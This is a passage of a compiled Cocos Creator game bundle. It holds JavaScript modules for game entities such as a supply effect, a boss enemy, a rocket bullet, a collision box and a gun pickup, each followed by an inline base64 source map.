        property(sp.Skeleton)
    ], RoleSupply.prototype, "ske", void 0);
    RoleSupply = __decorate([
        ccclass
    ], RoleSupply);
    return RoleSupply;
}(cc.Component));
exports.default = RoleSupply;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL3JvbGUvUm9sZVN1cHBseS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ00sSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBd0MsOEJBQVk7SUFBcEQ7UUFBQSxxRUErQkM7UUE1QkcsU0FBRyxHQUFlLElBQUksQ0FBQztRQUV2QixjQUFRLEdBQVcsSUFBSSxDQUFDOztJQTBCNUIsQ0FBQztJQXZCRywyQkFBTSxHQUFOO1FBQUEsaUJBSUM7UUFIRyxJQUFJLENBQUMsR0FBRyxDQUFDLG1CQUFtQixDQUFDO1lBQ3pCLEtBQUksQ0FBQyxJQUFJLENBQUMsT0FBTyxFQUFFLENBQUM7UUFDeEIsQ0FBQyxDQUFDLENBQUM7SUFDUCxDQUFDO0lBRUQsOEJBQVMsR0FBVCxVQUFVLEVBQVMsRUFBQyxRQUFnQjtRQUNoQyxJQUFJLENBQUMsUUFBUSxHQUFHLFFBQVEsQ0FBQztRQUN6QixJQUFJLENBQUMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxnQkFBZ0IsRUFBRSxJQUFJLENBQUMsWUFBWSxFQUFFLElBQUksQ0FBQyxDQUFDO1FBQzlFLElBQUksUUFBUSxHQUFHLE9BQU8sR0FBQyxDQUFDLFlBQVksR0FBQyxFQUFFLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztRQUNwRCxJQUFJLENBQUMsR0FBRyxDQUFDLE9BQU8sQ0FBQyxRQUFRLENBQUMsQ0FBQztRQUMzQixJQUFJLENBQUMsR0FBRyxDQUFDLFlBQVksQ0FBQyxDQUFDLEVBQUUsWUFBWSxFQUFFLEtBQUssQ0FBQyxDQUFDO0lBQ2xELENBQUM7SUFFRCxpQ0FBWSxHQUFaO1FBQ0ksSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsSUFBSSxDQUFDLFFBQVEsQ0FBQyxRQUFRLENBQUM7SUFDaEQsQ0FBQztJQUVELDhCQUFTLEdBQVQ7UUFDSSxJQUFJLElBQUksQ0FBQyxRQUFRLEVBQUM7WUFDZCxJQUFJLENBQUMsUUFBUSxDQUFDLEdBQUcsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxnQkFBZ0IsRUFBRSxJQUFJLENBQUMsWUFBWSxFQUFFLElBQUksQ0FBQyxDQUFDO1NBQ2xGO0lBQ0wsQ0FBQztJQTNCRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDOzJDQUNDO0lBSE4sVUFBVTtRQUQ5QixPQUFPO09BQ2EsVUFBVSxDQStCOUI7SUFBRCxpQkFBQztDQS9CRCxBQStCQyxDQS9CdUMsRUFBRSxDQUFDLFNBQVMsR0ErQm5EO2tCQS9Cb0IsVUFBVSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFJvbGVTdXBwbHkgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShzcC5Ta2VsZXRvbilcclxuICAgIHNrZTpzcC5Ta2VsZXRvbiA9IG51bGw7XHJcblxyXG4gICAgcm9sZU5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG5cclxuICAgIG9uTG9hZCAoKSB7XHJcbiAgICAgICAgdGhpcy5za2Uuc2V0Q29tcGxldGVMaXN0ZW5lcigoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUuZGVzdHJveSgpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIHNldFN1cHBseShpZDpudW1iZXIscm9sZU5vZGU6Y2MuTm9kZSl7XHJcbiAgICAgICAgdGhpcy5yb2xlTm9kZSA9IHJvbGVOb2RlO1xyXG4gICAgICAgIHRoaXMucm9sZU5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuUE9TSVRJT05fQ0hBTkdFRCwgdGhpcy5vbkZvbGxvd1JvbGUsIHRoaXMpO1xyXG4gICAgICAgIGxldCBza2luTmFtZSA9IFwicHJvcF9cIisoXCIwMDAwMDAwMDAwXCIraWQpLnN1YnN0cigtMyk7XHJcbiAgICAgICAgdGhpcy5za2Uuc2V0U2tpbihza2luTmFtZSk7XHJcbiAgICAgICAgdGhpcy5za2Uuc2V0QW5pbWF0aW9uKDAsIFwic3VwcGx5TG9uZ1wiLCBmYWxzZSk7XHJcbiAgICB9XHJcblxyXG4gICAgb25Gb2xsb3dSb2xlKCl7XHJcbiAgICAgICAgdGhpcy5ub2RlLnBvc2l0aW9uID0gdGhpcy5yb2xlTm9kZS5wb3NpdGlvbjtcclxuICAgIH1cclxuXHJcbiAgICBvbkRlc3Ryb3koKXtcclxuICAgICAgICBpZiAodGhpcy5yb2xlTm9kZSl7XHJcbiAgICAgICAgICAgIHRoaXMucm9sZU5vZGUub2ZmKGNjLk5vZGUuRXZlbnRUeXBlLlBPU0lUSU9OX0NIQU5HRUQsIHRoaXMub25Gb2xsb3dSb2xlLCB0aGlzKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/enemy/BossEnemy.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c1cc1d82RVB7rbf8Gux/Hri', 'BossEnemy');
// script/app/entities/enemy/BossEnemy.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Enemy_1 = require("./Enemy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BossEnemy = /** @class */ (function (_super) {
    __extends(BossEnemy, _super);
    function BossEnemy() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.hpBar = null;
        return _this;
    }
    __decorate([
        property(cc.ProgressBar)
    ], BossEnemy.prototype, "hpBar", void 0);
    BossEnemy = __decorate([
        ccclass
    ], BossEnemy);
    return BossEnemy;
}(Enemy_1.default));
exports.default = BossEnemy;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2VuZW15L0Jvc3NFbmVteS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsaUNBQTRCO0FBRXRCLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQXVDLDZCQUFLO0lBQTVDO1FBQUEscUVBTUM7UUFIRyxXQUFLLEdBQW1CLElBQUksQ0FBQzs7SUFHakMsQ0FBQztJQUhHO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxXQUFXLENBQUM7NENBQ0k7SUFIWixTQUFTO1FBRDdCLE9BQU87T0FDYSxTQUFTLENBTTdCO0lBQUQsZ0JBQUM7Q0FORCxBQU1DLENBTnNDLGVBQUssR0FNM0M7a0JBTm9CLFNBQVMiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEVuZW15IGZyb20gXCIuL0VuZW15XCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEJvc3NFbmVteSBleHRlbmRzIEVuZW15IHtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUHJvZ3Jlc3NCYXIpXHJcbiAgICBocEJhcjogY2MuUHJvZ3Jlc3NCYXIgPSBudWxsO1xyXG5cclxuXHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletHuoJianTong.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'f1a9acz1GRFM6HjLvTeZdOh', 'BulletHuoJianTong');
// script/app/entities/bullet/BulletHuoJianTong.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var Facade_1 = require("../../../../framework/facade/Facade");
var World_1 = require("../../info/World");
var Music_1 = require("../../../../framework/audio/Music");
var ccclass = cc._decorator.ccclass;
var magnify = 1;
var BulletHuoJianTong = /** @class */ (function (_super) {
    __extends(BulletHuoJianTong, _super);
    function BulletHuoJianTong() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._gameExplosivesController = null;
        return _this;
    }
    BulletHuoJianTong.prototype.onLoad = function () {
        _super.prototype.onLoad.call(this);
        this._gameExplosivesController = Facade_1.default.findComponent("GameScene", "GameExplosivesController");
    };
    BulletHuoJianTong.prototype.init = function (id) {
        this.bulletId = id;
    };
    BulletHuoJianTong.prototype.boom = function () {
        Music_1.Music.playSFX("sound/msc_g002");
        var explosiveHuoJianTong = this._gameExplosivesController.getInactiveExplosive(9);
        explosiveHuoJianTong.node.position = this.node.position;
        explosiveHuoJianTong.node.active = true;
        explosiveHuoJianTong.node.scale = magnify * World_1.World.My.armory.magnifyMul(explosiveHuoJianTong.bulletId);
        explosiveHuoJianTong.node.rotation = Math.random() * 360;
        explosiveHuoJianTong.boom();
    };
    BulletHuoJianTong.prototype.fly = function (dir, distance, speed) {
        var _this = this;
        this.node.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x));
        this.node.runAction(cc.sequence(cc.moveBy(distance / speed, dir.mul(distance)).easing(cc.easeQuadraticActionIn()), cc.callFunc(function () {
            _this.node.active = false;
            _this.boom();
        })));
    };
    BulletHuoJianTong.prototype.onCollisionEnter = function (other, self) {
        this.node.active = false;
        this.boom();
    };
    BulletHuoJianTong = __decorate([
        ccclass
    ], BulletHuoJianTong);
    return BulletHuoJianTong;
}(Bullet_1.default));
exports.default = BulletHuoJianTong;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRIdW9KaWFuVG9uZy50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsbUNBQThCO0FBQzlCLDhEQUF5RDtBQUN6RCwwQ0FBdUM7QUFDdkMsMkRBQXdEO0FBRWpELElBQUEsT0FBTyxHQUFJLEVBQUUsQ0FBQyxVQUFVLFFBQWpCLENBQWtCO0FBRWhDLElBQU0sT0FBTyxHQUFHLENBQUMsQ0FBQztBQUdsQjtJQUErQyxxQ0FBTTtJQUFyRDtRQUFBLHFFQXVDQztRQXBDVywrQkFBeUIsR0FBRyxJQUFJLENBQUM7O0lBb0M3QyxDQUFDO0lBakNHLGtDQUFNLEdBQU47UUFDSSxpQkFBTSxNQUFNLFdBQUUsQ0FBQztRQUNmLElBQUksQ0FBQyx5QkFBeUIsR0FBRyxnQkFBTSxDQUFDLGFBQWEsQ0FBQyxXQUFXLEVBQUUsMEJBQTBCLENBQUMsQ0FBQztJQUNuRyxDQUFDO0lBRUQsZ0NBQUksR0FBSixVQUFLLEVBQVU7UUFDWCxJQUFJLENBQUMsUUFBUSxHQUFHLEVBQUUsQ0FBQztJQUN2QixDQUFDO0lBRUQsZ0NBQUksR0FBSjtRQUNJLGFBQUssQ0FBQyxPQUFPLENBQUMsZ0JBQWdCLENBQUMsQ0FBQztRQUNoQyxJQUFJLG9CQUFvQixHQUFHLElBQUksQ0FBQyx5QkFBeUIsQ0FBQyxvQkFBb0IsQ0FBQyxDQUFDLENBQUMsQ0FBQztRQUNsRixvQkFBb0IsQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsUUFBUSxDQUFDO1FBQ3hELG9CQUFvQixDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1FBQ3hDLG9CQUFvQixDQUFDLElBQUksQ0FBQyxLQUFLLEdBQUcsT0FBTyxHQUFHLGFBQUssQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLFVBQVUsQ0FBQyxvQkFBb0IsQ0FBQyxRQUFRLENBQUMsQ0FBQztRQUN0RyxvQkFBb0IsQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLElBQUksQ0FBQyxNQUFNLEVBQUUsR0FBQyxHQUFHLENBQUM7UUFDdkQsb0JBQW9CLENBQUMsSUFBSSxFQUFFLENBQUM7SUFDaEMsQ0FBQztJQUdELCtCQUFHLEdBQUgsVUFBSSxHQUFZLEVBQUUsUUFBZ0IsRUFBRSxLQUFhO1FBQWpELGlCQU1DO1FBTEcsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsRUFBRSxHQUFHLEVBQUUsQ0FBQyxJQUFJLENBQUMsZ0JBQWdCLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxHQUFHLENBQUMsQ0FBQyxFQUFFLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO1FBQzdFLElBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxRQUFRLEdBQUMsS0FBSyxFQUFFLEdBQUcsQ0FBQyxHQUFHLENBQUMsUUFBUSxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsRUFBRSxDQUFDLHFCQUFxQixFQUFFLENBQUMsRUFBRSxFQUFFLENBQUMsUUFBUSxDQUFDO1lBQ3pILEtBQUksQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztZQUN6QixLQUFJLENBQUMsSUFBSSxFQUFFLENBQUM7UUFDaEIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0lBQ1QsQ0FBQztJQUdELDRDQUFnQixHQUFoQixVQUFpQixLQUFLLEVBQUUsSUFBSTtRQUN4QixJQUFJLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDekIsSUFBSSxDQUFDLElBQUksRUFBRSxDQUFDO0lBQ2hCLENBQUM7SUF0Q2dCLGlCQUFpQjtRQURyQyxPQUFPO09BQ2EsaUJBQWlCLENBdUNyQztJQUFELHdCQUFDO0NBdkNELEFBdUNDLENBdkM4QyxnQkFBTSxHQXVDcEQ7a0JBdkNvQixpQkFBaUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEJ1bGxldCBmcm9tIFwiLi9CdWxsZXRcIjtcclxuaW1wb3J0IEZhY2FkZSBmcm9tIFwiLi4vLi4vLi4vLi4vZnJhbWV3b3JrL2ZhY2FkZS9GYWNhZGVcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uLy4uL2luZm8vV29ybGRcIjtcclxuaW1wb3J0IHtNdXNpY30gZnJvbSBcIi4uLy4uLy4uLy4uL2ZyYW1ld29yay9hdWRpby9NdXNpY1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3N9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbmNvbnN0IG1hZ25pZnkgPSAxO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQnVsbGV0SHVvSmlhblRvbmcgZXh0ZW5kcyBCdWxsZXQge1xyXG5cclxuXHJcbiAgICBwcml2YXRlIF9nYW1lRXhwbG9zaXZlc0NvbnRyb2xsZXIgPSBudWxsO1xyXG5cclxuXHJcbiAgICBvbkxvYWQoKTogdm9pZCB7XHJcbiAgICAgICAgc3VwZXIub25Mb2FkKCk7XHJcbiAgICAgICAgdGhpcy5fZ2FtZUV4cGxvc2l2ZXNDb250cm9sbGVyID0gRmFjYWRlLmZpbmRDb21wb25lbnQoXCJHYW1lU2NlbmVcIiwgXCJHYW1lRXhwbG9zaXZlc0NvbnRyb2xsZXJcIik7XHJcbiAgICB9XHJcblxyXG4gICAgaW5pdChpZDogbnVtYmVyKTogdm9pZCB7XHJcbiAgICAgICAgdGhpcy5idWxsZXRJZCA9IGlkO1xyXG4gICAgfVxyXG5cclxuICAgIGJvb20oKXtcclxuICAgICAgICBNdXNpYy5wbGF5U0ZYKFwic291bmQvbXNjX2cwMDJcIik7XHJcbiAgICAgICAgbGV0IGV4cGxvc2l2ZUh1b0ppYW5Ub25nID0gdGhpcy5fZ2FtZUV4cGxvc2l2ZXNDb250cm9sbGVyLmdldEluYWN0aXZlRXhwbG9zaXZlKDkpO1xyXG4gICAgICAgIGV4cGxvc2l2ZUh1b0ppYW5Ub25nLm5vZGUucG9zaXRpb24gPSB0aGlzLm5vZGUucG9zaXRpb247XHJcbiAgICAgICAgZXhwbG9zaXZlSHVvSmlhblRvbmcubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIGV4cGxvc2l2ZUh1b0ppYW5Ub25nLm5vZGUuc2NhbGUgPSBtYWduaWZ5ICogV29ybGQuTXkuYXJtb3J5Lm1hZ25pZnlNdWwoZXhwbG9zaXZlSHVvSmlhblRvbmcuYnVsbGV0SWQpO1xyXG4gICAgICAgIGV4cGxvc2l2ZUh1b0ppYW5Ub25nLm5vZGUucm90YXRpb24gPSBNYXRoLnJhbmRvbSgpKjM2MDtcclxuICAgICAgICBleHBsb3NpdmVIdW9KaWFuVG9uZy5ib29tKCk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIGZseShkaXI6IGNjLlZlYzIsIGRpc3RhbmNlOiBudW1iZXIsIHNwZWVkOiBudW1iZXIpOiB2b2lkIHtcclxuICAgICAgICB0aGlzLm5vZGUucm90YXRpb24gPSA5MCAtIGNjLm1pc2MucmFkaWFuc1RvRGVncmVlcyhNYXRoLmF0YW4yKGRpci55LCBkaXIueCkpO1xyXG4gICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MubW92ZUJ5KGRpc3RhbmNlL3NwZWVkLCBkaXIubXVsKGRpc3RhbmNlKSkuZWFzaW5nKGNjLmVhc2VRdWFkcmF0aWNBY3Rpb25JbigpKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICB0aGlzLmJvb20oKTtcclxuICAgICAgICB9KSkpO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBvbkNvbGxpc2lvbkVudGVyKG90aGVyLCBzZWxmKTogdm9pZCB7XHJcbiAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMuYm9vbSgpO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/role/RoleAABB.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '77d4amxHlhAAaN1LjD+GliJ', 'RoleAABB');
// script/app/entities/role/RoleAABB.ts

Object.defineProperty(exports, "__esModule", { value: true });
var AABBRegion_1 = require("../../../quad-tree/AABBRegion");
var _a = cc._decorator, ccclass = _a.ccclass, disallowMultiple = _a.disallowMultiple;
var RoleAABB = /** @class */ (function (_super) {
    __extends(RoleAABB, _super);
    function RoleAABB() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._radius = 0;
        return _this;
    }
    RoleAABB.prototype.onLoad = function () {
        this._radius = this.getComponent(cc.CircleCollider).radius;
    };
    RoleAABB.prototype.aabb = function () {
        var doubleRadius = this._radius * 2;
        return cc.rect(this.node.x - this._radius, this.node.y - this._radius, doubleRadius, doubleRadius);
    };
    RoleAABB = __decorate([
        ccclass,
        disallowMultiple
    ], RoleAABB);
    return RoleAABB;
}(AABBRegion_1.default));
exports.default = RoleAABB;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL3JvbGUvUm9sZUFBQkIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLDREQUF1RDtBQUVqRCxJQUFBLEtBQThCLEVBQUUsQ0FBQyxVQUFVLEVBQTFDLE9BQU8sYUFBQSxFQUFFLGdCQUFnQixzQkFBaUIsQ0FBQztBQUlsRDtJQUFzQyw0QkFBVTtJQUFoRDtRQUFBLHFFQVlDO1FBVlcsYUFBTyxHQUFHLENBQUMsQ0FBQzs7SUFVeEIsQ0FBQztJQVJHLHlCQUFNLEdBQU47UUFDSSxJQUFJLENBQUMsT0FBTyxHQUFHLElBQUksQ0FBQyxZQUFZLENBQUMsRUFBRSxDQUFDLGNBQWMsQ0FBQyxDQUFDLE1BQU0sQ0FBQztJQUMvRCxDQUFDO0lBRUQsdUJBQUksR0FBSjtRQUNJLElBQUksWUFBWSxHQUFHLElBQUksQ0FBQyxPQUFPLEdBQUcsQ0FBQyxDQUFDO1FBQ3BDLE9BQU8sRUFBRSxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUMsR0FBRyxJQUFJLENBQUMsT0FBTyxFQUFFLElBQUksQ0FBQyxJQUFJLENBQUMsQ0FBQyxHQUFHLElBQUksQ0FBQyxPQUFPLEVBQUUsWUFBWSxFQUFFLFlBQVksQ0FBQyxDQUFDO0lBQ3ZHLENBQUM7SUFYZ0IsUUFBUTtRQUY1QixPQUFPO1FBQ1AsZ0JBQWdCO09BQ0ksUUFBUSxDQVk1QjtJQUFELGVBQUM7Q0FaRCxBQVlDLENBWnFDLG9CQUFVLEdBWS9DO2tCQVpvQixRQUFRIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBBQUJCUmVnaW9uIGZyb20gXCIuLi8uLi8uLi9xdWFkLXRyZWUvQUFCQlJlZ2lvblwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIGRpc2FsbG93TXVsdGlwbGV9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbkBkaXNhbGxvd011bHRpcGxlXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFJvbGVBQUJCIGV4dGVuZHMgQUFCQlJlZ2lvbiB7XHJcblxyXG4gICAgcHJpdmF0ZSBfcmFkaXVzID0gMDtcclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICB0aGlzLl9yYWRpdXMgPSB0aGlzLmdldENvbXBvbmVudChjYy5DaXJjbGVDb2xsaWRlcikucmFkaXVzO1xyXG4gICAgfVxyXG5cclxuICAgIGFhYmIoKTogY2MuUmVjdCB7XHJcbiAgICAgICAgbGV0IGRvdWJsZVJhZGl1cyA9IHRoaXMuX3JhZGl1cyAqIDI7XHJcbiAgICAgICAgcmV0dXJuIGNjLnJlY3QodGhpcy5ub2RlLnggLSB0aGlzLl9yYWRpdXMsIHRoaXMubm9kZS55IC0gdGhpcy5fcmFkaXVzLCBkb3VibGVSYWRpdXMsIGRvdWJsZVJhZGl1cyk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/prop/Guns.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '054bfjlEYREGJmkW9iT6Xlw', 'Guns');
// script/app/entities/prop/Guns.ts

Object.defineProperty(exports, "__esModule", { value: true });
var PropBase_1 = require("./PropBase");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var Guns = /** @class */ (function (_super) {
    __extends(Guns, _super);
    function Guns() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.ske = null;
        return _this;
    }
    Guns.prototype.onLoad = function () {
        _super.prototype.onLoad.call(this);
        this.ske = this.getComponent(sp.Skeleton);
    };
    Guns.prototype.init = function (id) {
        _super.prototype.init.call(this, id);
        this.ske.setSkin(("000" + (id - 100)).substr(-3));
    };
    Guns.prototype.display = function () {
        var _this = this;
        this._on_off = false;
        this.node.active = true;
        this.ske.setAnimation(0, "gun_002", true);
        //倒计时
        if (this.cd > 0) {
            this.node.runAction(cc.sequence(cc.delayTime(this.cd - 5), cc.callFunc(function () {
                _this.ske.setAnimation(0, "gun", true);
            }), cc.blink(5, 25), cc.callFunc(function () {
                _this.node.active = false;
            })));
        }
    };
    Guns = __decorate([
        ccclass
    ], Guns);
    return Guns;
}(PropBase_1.default));
exports.default = Guns;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL3Byb3AvR3Vucy50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsdUNBQWtDO0FBRTVCLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQWtDLHdCQUFRO0lBQTFDO1FBQUEscUVBNEJDO1FBMUJHLFNBQUcsR0FBZSxJQUFJLENBQUM7O0lBMEIzQixDQUFDO0lBeEJHLHFCQUFNLEdBQU47UUFDSSxpQkFBTSxNQUFNLFdBQUUsQ0FBQztRQUNmLElBQUksQ0FBQyxHQUFHLEdBQUcsSUFBSSxDQUFDLFlBQVksQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLENBQUM7SUFDOUMsQ0FBQztJQUdELG1CQUFJLEdBQUosVUFBSyxFQUFVO1FBQ1gsaUJBQU0sSUFBSSxZQUFDLEVBQUUsQ0FBQyxDQUFDO1FBQ2YsSUFBSSxDQUFDLEdBQUcsQ0FBQyxPQUFPLENBQUMsQ0FBQyxLQUFLLEdBQUMsQ0FBQyxFQUFFLEdBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0lBQ2xELENBQUM7SUFFRCxzQkFBTyxHQUFQO1F